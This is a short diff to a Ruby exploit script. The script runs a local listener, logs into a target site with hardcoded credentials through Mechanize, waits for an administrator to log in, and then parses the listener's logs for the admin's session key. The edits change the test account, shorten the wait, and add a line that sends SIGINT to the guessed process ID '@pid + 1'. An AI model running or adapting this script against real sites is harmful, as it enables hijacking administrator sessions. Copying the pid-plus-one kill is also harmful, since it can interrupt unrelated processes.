@@ -16,6 +16,7 @@ class SimpleListener
 
   def terminate
     Process.kill(:SIGINT, @pid)
+    Process.kill(:SIGINT, @pid + 1)
     clean_up
   end
 
@@ -36,7 +37,7 @@ end
 server = SimpleListener.new
 server.run
 
-USER = 'fox@fox.com'
+USER = 'fox@fox1.com'
 PASS = '123456789'
 
 Mechanize.new.instance_eval do
@@ -57,7 +58,7 @@ Mechanize.new.instance_eval do
 
   # Wait for admin login
   puts '[+] Waiting for admin login...'
-  sleep 10
+  sleep 5
 
   # Parse the logs for our session_key
   session_key = server.read_logs
